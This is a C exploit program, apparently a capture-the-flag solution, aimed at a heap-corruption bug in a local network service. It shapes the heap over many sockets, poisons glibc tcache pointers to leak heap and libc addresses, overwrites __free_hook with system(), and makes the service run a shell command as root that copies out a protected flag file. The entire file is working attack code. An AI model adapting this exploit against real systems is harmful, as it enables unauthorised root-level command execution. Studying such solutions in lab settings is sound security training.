#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <arpa/inet.h>

#define OFFSET_HEAP 0x12f50
#define OFFSET_LIBC 0x1ec0d0
#define OFFSET_FREE_HOOK 0x1eeb28
#define OFFSET_SYSTEM 0x55410

#define yield() usleep(1000)

int conn() {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        puts("socket creation failed...");
        exit(0);
    }

    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(21337);

    if (connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) {
        puts("connection with the server failed...");
        exit(0);
    }

    return sockfd;
}

void writeall(int fd, char *buf, size_t len) {
    size_t towrite = len;
    while (towrite) {
        ssize_t written = write(fd, buf, towrite);
        if (written <= 0) {
            puts("write failure");
            exit(0);
        }
        towrite -= written;
    }
}

void readall(int fd, char *buf, size_t len) {
    size_t toread = len;
    while (toread) {
        ssize_t readden = read(fd, buf, toread);
        if (readden <= 0) {
            puts("read failure");
            exit(0);
        }
        toread -= readden;
    }
}

int main() {
    unsigned i;
    int conns[16];
    char *chunk = malloc(0x10000);

    // open connections
    for (i = 0; i < 16; i++) {
        conns[i] = conn();
        yield();
    }

    // fake 0x10000 area, fill with 0x31 to bypass some tcache checks later on
    for (i = 1; i < 0x10000u / 8; i+=2) {
        ((size_t*)chunk)[i] = 0x31;
    }
    writeall(conns[0], chunk, 0x10000 - 1);
    yield();

    // fill up remaining chunks 1 to 9
    for (i = 1; i < 9; i++) {
        writeall(conns[i], chunk, 0x10000u >> i);
        yield();
    }

    // allocate 3 0x30 chunks, A chunk right behind the 0x10000 area
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    yield();
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();

    // close A buffer, places pointer to it in tcache freelist head
    close(conns[13]);
    yield();

    // bug: free B, and auf write two nullbytes into free'd B memory.
    // partially overwrites tcaches next pointer pointing to A.
    write(conns[15], "\0", 1);
    close(conns[14]);
    yield();

    // allocate two 0x30 chunks, Y is likely to be placed inside the 0x10000 area
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    yield();

    // free Y chunk, writes heap base into 0x10000 area
    close(conns[14]);
    yield();

    // read the buffer back in by sending '\n'
    write(conns[0], "\n", 1);
    // skip the hello message, linus would insult me for writing this code
    do {
        read(conns[0], chunk, 1);
    } while(*chunk != '\n');
    readall(conns[0], chunk, 0x10000);

    // search for heap address
    size_t *leak = memmem(chunk, 0x10000, "YYYYYYYY", 8);
    if (!leak) {
        puts("heapbase not found :(");
        exit(0);
    }
    size_t heapbase = leak[-1];
    printf("heapbase located at: 0x%lx\n", heapbase);

    // shape tcache / heap so there is at least one free entry before the bug is triggered again
    close(conns[15]);
    close(conns[13]);
    yield();
    conns[13] = conn();
    yield();
    conns[14] = conn();
    yield();
    conns[15] = conn();
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(conns[13]);
    yield();

    // bug again: overwrite tcache pointer
    size_t addr = heapbase + OFFSET_HEAP;
    write(conns[15], &addr, 7);
    close(conns[14]);
    yield();

    // allocates fake chunk over filler chunk 5's header
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    ((size_t*)chunk)[0] = 0;
    ((size_t*)chunk)[1] = 0x811;
    ((size_t*)chunk)[2] = 0;
    ((size_t*)chunk)[3] = 0;
    write(conns[14], chunk, 0x20);
    yield();

    // free chunk 5
    write(conns[5], "\n", 1);
    yield();

    // trigger a realloc (because heap is overlapping, this will lead to problems) and send leaked data out
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n", 0x40);
    yield();

    // read in the libc leak
    do {
        read(conns[14], chunk, 1);
    } while(*chunk != '\n');
    read(conns[14], chunk, 0x20);
    leak = (size_t*)chunk;
    if (leak[1] == 0x811) {
        puts("libc leak not found :(");
        exit(0);
    }
    printf("leaked: %lx %lx %lx %lx\n", leak[0], leak[1], leak[2], leak[3]);
    size_t libcbase = leak[2] -= OFFSET_LIBC;
    printf("libc located at: 0x%lx\n", libcbase);

    // prepare to trigger the bug one last time...
    int x, y, z;
    x = conn();
    yield();
    y = conn();
    yield();
    z = conn();
    yield();
    write(x, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(y, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(z, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(x);
    yield();

    // bug again: overwrite tcache pointer to point at free hook
    addr = libcbase + OFFSET_FREE_HOOK;
    write(z, &addr, 7);
    close(y);
    yield();

    // get chunk overlapping the free hook, overwrite it with system
    write(conns[10], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    memset(chunk, 0, 0x20);
    *(size_t*)chunk = libcbase + OFFSET_SYSTEM;
    write(conns[11], chunk, 0x20);
    yield();

    // create chunk with command to be executed
    x = conn();
    write(x, "/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0", 0x50);
    // free the chunk, executes the command as root
    close(x);

    // we can now cat /tmp/flag
    fflush(stdout);
    system("/bin/sh");
    return 0;
}
